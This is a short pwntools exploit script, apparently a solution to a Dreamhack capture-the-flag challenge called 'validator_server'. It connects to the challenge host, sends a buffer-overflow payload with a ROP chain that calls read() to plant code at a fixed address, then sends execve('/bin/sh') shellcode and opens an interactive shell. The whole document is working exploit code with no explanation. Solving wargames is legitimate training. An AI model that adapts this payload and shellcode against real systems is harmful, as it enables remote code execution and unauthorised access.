from pwn import *

#p = process("./validator_sever")
p = remote("host3.dreamhack.games", 10796)
context.log_level       = "DEBUG"
context.arch            = "amd64"
main = 0x000000000040063a
rdi_ret = 0x00000000004006f3
payload = b"DREAMHACK!"
lst = []
for i in range(118,0,-1):
    lst.append(i)
payload += bytearray(lst)
payload += p64(0)
payload += p64(0x4006f3) # pop rdi ret 
payload += p64(0) #1st argument
payload += p64(0x4006f1) # pop rsi ; pop r15 ; ret
payload += p64(0x601018) #2nd argument
payload += p64(0) #dummy for pop r15
payload += p64(0x40057b)#pop rdx ; ret
payload += p64(0x50)#length of shellcoded
payload += p64(0x400470)#read_plt
payload += p64(0x601018)#ret of read() -> address of shellcode
p.sendline(payload)
p.sendline(b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05")
p.interactive()
#+2 -1 -1 -1 -1 -1 -1 -1 -1 -1 -1 -1 -1 -1 -1   
